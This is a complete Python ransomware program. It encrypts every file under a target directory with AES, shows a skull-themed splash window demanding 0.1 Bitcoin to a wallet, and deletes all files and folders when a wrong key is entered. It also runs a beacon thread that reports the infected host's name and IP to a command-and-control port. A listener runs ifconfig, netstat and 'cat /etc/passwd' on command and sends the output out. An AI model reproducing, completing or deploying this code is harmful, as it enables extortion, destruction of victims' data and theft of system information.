from Crypto.Cipher import AES
from tkinter import *
from PIL import ImageTk, Image
import os, sys, base64, random, string, time, socket, threading, shutil

path = '//root/Desktop/test' #edit this to target directory
serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serv.bind(('192.168.170.128', 50003)) #create a listener
serv.listen(1) #allow 1 connection
c2=('127.0.0.1', 5002) #this is where we are exfil-ing to

def main():

	t=threading.Thread(target=beacon) #create a thread for the beacon
	t.setDaemon(True) #set daemon
	t1=threading.Thread(target=runransom) #create a thread for the ransom
	t1.setDaemon(True) #set daemon
	
	try:
		t.start() #execute the threads
		t1.start() 
	except (KeyboardInterrupt, SystemExit) as e: #ctrl+c
		t.join() #gracefully stop the threads
		t1.join() #and exit the program
		t.stop() 
		t1.stop()
		sys.exit()
		
	checkc2() #execute the exfil function

def runransom():
	
	if os.path.exists('./.3243j4lkj42342h4l34h2'): #if the script has already been executed
		ran = open('.3243j4lkj42342h4l34h2', 'r') #open hidden file
		readencodekeystring=ran.read() #read it
		encodekeystring=readencodekeystring[4:48] #specify key contents
		keystring = base64.b64decode(encodekeystring) # encode it
		ransomalreadyran(keystring) #call alradyran function and pass it the key
	else: #if the script has not aleady been executed
		encrypt() #call encrypt function

def encrypt():

	filecounter = 0
	ran = open('.3243j4lkj42342h4l34h2', 'w+') #create hidden file and open it in write mode
	keystring = ''.join([random.choice(string.digits) for n in xrange(32)]) #generate a random 16 byte digit string for the key
	encodekeystring = base64.b64encode(keystring) #encode key
	ran.write('key:'+encodekeystring) #write the key to the hidden file
	ran.close() #close file
	
	filearray=[]
	for root, dirs, files in os.walk(path): #walk directories, sub directories, files in specified path
		for file in files: #for each file found 
			filecounter+=1 #increment counter
			filefound = (os.path.join(root, file)) #pass the path to the file
			openfilefound = open(filefound, 'rb') #open the file in read bytes mode
			cleartext = openfilefound.read() #reads the file contents	
			openfilefound.close() #close file
			enc = AES.new(keystring[:32]) #create key object
			AES_string = (str(cleartext) + (AES.block_size - len(str(cleartext)) % AES.block_size) * "\0") #apply algorithm and padding to byte block
			ciphertext = base64.b64encode(enc.encrypt(AES_string)) #encrypt and encode clear text
			openfilefound = open(filefound, 'wb') #open the file in write bytes mode
			openfilefound.write(ciphertext) #write cipher text to file
			openfilefound.close() #close file
			filearray.append(filefound)
			
	
	if filecounter == 0: #if no files are found
		os.remove('.3243j4lkj42342h4l34h2') #remove hiddent file
		sys.exit() #exit script
		#sys.exit(0) #exit script
	ransom(keystring,filearray) #call ransom GUI, passing key and filenames

def decrypt(keystring):

	for root, dirs, files in os.walk(path): #walk directories, sub directories, files in specified path
		for file in files: #for each file found 
			filefound = (os.path.join(root, file)) #pass the path to the file
			openfilefound = open(filefound, 'rb') #open the file in read bytes mode
			filecontents = openfilefound.read() #reads encrypted file contents	
			openfilefound.close() #close file
			dec = AES.new(keystring[:32]) #declare AES key
			ciphertxt = dec.decrypt(base64.b64decode(filecontents)) #decode and decrypt cipher text
			cleartext = ciphertxt.rstrip("\0") #strip padding
			openfilefound = open(filefound, 'wb') #open the file in write bytes mode
			openfilefound.write(cleartext) #write clear text to file
			openfilefound.close() #close file
	os.remove('.3243j4lkj42342h4l34h2') #delete the hidden file
	
def ransomalreadyran(keystring):

	root = Tk()
	root.geometry('550x645')
	root.title('Surfa')

	img = ImageTk.PhotoImage(Image.open(resource_path("skull.png")))
	panel = Label(root, image = img)
	panel .place(relx=0.50, rely=0.76, anchor='s')

	l1 = Label(root, text='Your files have been encrypted.') 
	l1 .place(relx=0.5, rely=0.77, anchor='s')
	l2 = Label(root, text='Send 0.1 Bitcoin to the wallet: 3LYmZHemdG1phv3djSDQfH4GnvsN7JeV9n.') 
	l2 .place(relx=0.5, rely=0.81, anchor='s')
	l3 = Label(root, text='Attach your email to the transaction to recieve your key.') 
	l3 .place(relx=0.5, rely=0.85, anchor='s')
	l4 = Label(root, text='Entering the the wrong key will result in permanently lost files.') 
	l4 .place(relx=0.5, rely=0.89, anchor='s')
	l5 = Label(root, text='Input key:') 
	l5 .place(relx=0.40, rely=0.93, anchor='s')
	e1 = Entry(root,text = '', width=28)
	e1 .place(relx=0.62, rely=0.93, anchor='s')
	b1 = Button(root,text = 'Enter', width=10, font=("Helvetica",8), command=lambda: (checkinput(e1,root,keystring)))
	b1 .place(relx=0.5, rely=0.986, anchor='s')
	root.wm_attributes('-type', 'splash') #remove nav bar from window
	root.mainloop()

def ransom(keystring,filearray):

	root = Tk()
	root.geometry('550x645')
	root.title('Surfa')

	img = ImageTk.PhotoImage(Image.open(resource_path("skull.png")))
	panel = Label(root, image = img)
	panel .place(relx=0.32, rely=0.76, anchor='s')
	
	l1 = Label(root, text='Your files have been encrypted.') 
	l1 .place(relx=0.5, rely=0.77, anchor='s')
	l2 = Label(root, text='Send 0.1 Bitcoin to the wallet: 3LYmZHemdG1phv3djSDQfH4GnvsN7JeV9n.') 
	l2 .place(relx=0.5, rely=0.81, anchor='s')
	l3 = Label(root, text='Attach your email to the transaction to recieve your key.') 
	l3 .place(relx=0.5, rely=0.85, anchor='s')
	l4 = Label(root, text='Entering the the wrong key will result in permanently lost files.') 
	l4 .place(relx=0.5, rely=0.89, anchor='s')
	l5 = Label(root, text='Input key:') 
	l5 .place(relx=0.40, rely=0.93, anchor='s')
	e1 = Entry(root,text = '', width=28)
	e1 .place(relx=0.62, rely=0.93, anchor='s')
	b1 = Button(root,text = 'Enter', width=10, font=("Helvetica",8), command=lambda: (checkinput(e1,root,keystring)))
	b1 .place(relx=0.5, rely=0.986, anchor='s')
	f1 = Label(root, text = 'Locked files ')
	f1 .place(relx=0.80, rely=0.07, anchor='s')
	lframe = Frame(root, width=200,height=420)
	lframe.pack_propagate(0) # Stops child widgets of label_frame from resizing it
	lframe.place(relx=0.80,rely=0.72, anchor='s')
	f2 = Label(lframe, text=("\n".join(filearray)),font=("Helvetica",8), justify=LEFT)
	f2.pack()
	root.wm_attributes('-type', 'splash') #remove nav bar from window
	root.mainloop()
		
def checkinput(e1,root,keystring):

	userinputkey = e1.get() #get users input from GUI entry
	if userinputkey == keystring: #if the inputted key is correct
		decrypt(keystring) #call decrypt function
		root.destroy() #close window	
	else: #the key is wrong
		delete() #call delete
		#the below is really buggy so had to make a function to close window
		incorrectpopup() #notify user the key is incorrect
		root.after(2001, killroot, root) #after 2seconds close GUI
		
def incorrectpopup():

	groot = Tk()
	groot.geometry('200x80')
	groot.title('')

	l0 = Label(groot, text='Incorrect key', font=("Helvetica",15)) 
	l0 .place(relx=0.5, rely=0.40, anchor='s')
	l0 = Label(groot, text='Your files have been deleted') 
	l0 .place(relx=0.5, rely=0.80, anchor='s')
	groot.after(2000, killgroot, groot)

def killgroot(groot):
	groot.destroy() #groot is the incorrect message popup

def killroot(root):
	root.destroy() #root is ransom message GUI

def delete():
	
	for root, dirs, files in os.walk(path): #walk directories, sub directories, files in specified path
		for file in files: #for each file found 
			filefound = (os.path.join(root, file)) #pass the path to the file
			os.remove(filefound) #remove the files
		for dir in dirs: #for each directory found 
			dirfound = (os.path.join(root, dir)) #pass the path to the directory
			shutil.rmtree(dirfound) #remove the directories
	os.remove('.3243j4lkj42342h4l34h2') #delete the hidden file

def beacon():

	targetname=socket.gethostname() #get infected host name
	targetIP = socket.gethostbyname(targetname) #get infected host IP
	enctarget=base64.b64encode('infected:'+targetIP+'/'+targetname) #create ransom beacon message
	
	while True: #keep trying to establish connection to beacon
		client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #If theres a delay reboot or kill threads
		try: #try to connect
			client_socket.connect(('127.0.0.1', 5001))
			client_socket.send('srfa\n') #send malware check-in
			while True: #keep sending the beacon message
				client_socket.send(enctarget+'\n')
				time.sleep(5) #every 5seconds
		except socket.error: #error due to no listener
			time.sleep(5) #wait 5seconds and try again
			pass #carry on with the loop

def checkc2():

	while True:
		conn, addr = serv.accept() #incoming connection
		try:
			s=socket.socket()
			s.connect(c2)
			conn.send('C2 online and awaiting commands')
			break
		except socket.error:
			conn.send('C2 offline.. trying again in 5seconds')
			time.sleep(5)
			pass
		
	exfil(s)
	
def exfil(s):

	while True:
		print 'once'
		conn, addr = serv.accept() #incoming connection
		try:
			s.send('')
			print'up'
			from_client = '' 
			data = conn.recv(4096) #RECIEVED DATA FROM CONNECTEE
			from_client += data #STORE IT
			conn.send('Command \''+from_client+'\' acknowledged\n') #send acknowledgement 
			print from_client
			if from_client == 'ifconfig': #exfil ifconfig
				pullif=os.popen('ifconfig') #excute command on the host
				ifoutput=pullif.read(1024) #read it and keep in variable
				while (ifoutput): #send the command output
					s.send(ifoutput)
					ifoutput=pullif.read(1024)
				conn.send(from_client + 'complete')
						
			elif from_client == 'netstat':
				pullnetstat=os.popen('netstat -anp')
				netstatout=pullnetstat.read(1024)
				while (netstatout):
					s.send(netstatout)
					netstatout=pullnetstat.read(1024)
				conn.send(from_client + 'complete')
	
			elif from_client == 'routing':
				pullrouting=os.popen('netstat -r')
				routingout=pullrouting.read(1024)  
				while (routingout):
					s.send(routingout)
					routingout=pullrouting.read(1024)
				conn.send(from_client + 'complete')
					
			elif from_client == 'shadow':
				pullshadow=os.popen('cat /etc/passwd')
				shadowout=pullshadow.read(1024)  
				while (shadowout):
					s.send(shadowout)
					shadowout=pullshadow.read(1024)
				conn.send(from_client + 'complete')
						
			elif from_client == 'exit':
				#exit and clean up, delete key file?
				s.shutdown(socket.SHUT_WR)
				s.close 
				serv.shutdown(socket.SHUT_RDWR)
				serv.close() #close listener and exit program
				sys.exit()
						
			else: 
				conn.send('Unknown command\n')
				
		except socket.error:
			print 'socket error'
			break
				
	conn.send('C2 offline.. trying again in 5seconds')
	time.sleep(5)
	checkc2()
			
		
def resource_path(relative_path): #used to pull skull.png 
     if hasattr(sys, '_MEIPASS'):
         return os.path.join(sys._MEIPASS, relative_path)
     return os.path.join(os.path.abspath("."), relative_path)
    
main()
